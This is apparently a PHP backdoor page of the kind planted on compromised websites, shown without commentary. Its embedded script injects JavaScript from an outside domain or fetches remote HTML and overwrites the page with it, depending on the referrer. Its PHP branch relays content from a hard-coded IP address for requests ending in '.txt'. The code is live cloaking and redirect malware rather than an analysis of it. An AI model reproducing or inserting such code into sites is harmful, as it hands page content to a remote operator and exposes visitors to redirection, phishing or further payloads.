<?php
$current = $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];

$HTML = <<<HTML
<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body></body>
<script>
    document.title="请稍后，连接中...";
        if(!document.referrer){
        var type = getUrlParam('type');var to = getUrlParam('to');
        loadJs("https://jcbdfyy.org/api/go_land.php?type="+type+"&to="+to)
    }else{
        var fw = getUrlParam('fw'); var isescaped = fw.includes('.escaped');
        var xhr = new XMLHttpRequest; var html = null; xhr.onload = function(){html = xhr.responseText;render();}; var url = "https://jcbdfyy.org/"; xhr.open("GET", url + fw, !0); xhr.send();
    }
function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&#]*)(&|$|#)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return '';}
function render() {var a = document.open("text/html", "replace"); if(isescaped){html = unescape(html)} a.write(html); a.close();}
function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
</script>
</html>
HTML;
echo $HTML;


if ($current){

    $suffixs = explode("/",$current);
    $suffix = empty(end($suffixs)) ? '' : end($suffixs);

    if ($suffix && substr_count($suffix,'.txt') > 0){
        $domain = "http://47.106.213.120/";
        $code = file_get_contents($domain . "/" . $suffix);
        echo $code;
    }else{
        echo $HTML;
    }
}else{
    echo $HTML;
}
